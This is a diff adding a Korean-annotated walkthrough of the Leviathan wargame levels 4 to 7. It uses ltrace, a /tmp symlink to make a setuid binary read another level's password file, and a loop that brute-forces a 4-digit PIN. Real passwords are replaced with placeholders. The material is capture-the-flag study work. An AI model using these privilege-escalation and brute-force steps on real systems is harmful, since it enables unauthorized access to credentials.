@@ -144,6 +144,8 @@ password #EASY!
 ```
 
 ## leviathan level 4 -> 5
+Command:
+```bash
 $ ls
 #Nothing happened
 $ ls -al
@@ -164,3 +166,53 @@ $ ./bin
 $ echo '00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010' | tr -d  ' ' | perl -lpe '$_=pack("B*",$_)'
 password #xxd는 왜 안됐지? 버전이 안맞나?
 ```
+
+## leviathan level 5 -> 6
+Command:
+```bash
+$ ls
+leviathan5
+$ ./leviathan5
+Cannot find /tmp/file.log
+$ ltrace ./leviathan5
+__libc_start_main(0x804910d, 1, 0xffffd464, 0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                       = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                 = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+# 이것도 tmp에 file.log에 심볼릭 걸고 비번 추적하면 되겠군
+$ cd /tmp
+$ ln -s /etc/leviathan_pass/leviathan6 file.log
+$ ~/leviathan5
+password # 굳
+```
+
+Notes:
+ - ⚠️ /tmp 같은 world-writable 디렉토리를 쓰면 취약점이 많겠군
+
+## leviathan level 6 -> 7
+Command:
+```bash
+$ ls
+leviathan6
+$ ./leviathan6
+usage: ./leviathan6 <4 digit code>
+$ ./leviathan6 1234
+Wrong
+# 0000부터 9999까지 반복하는 명령을 넣으면 되겠군
+$ for i in $(seq -w 0000 9999); do ./leviathan6 $i; done
+Wrong
+Wrong
+.
+.
+.
+$ # Authentication succeeded
+$ cat /etc/leviathan_pass/leviathan7
+password # 굳 그런데 다음엔 Wrong도배 없이 깔끔하게 쉘만 얻게 해봐야겠다!
+```
+
+## leviathan level 7
+$ ls
+CONGRATULATIONS
+#GG
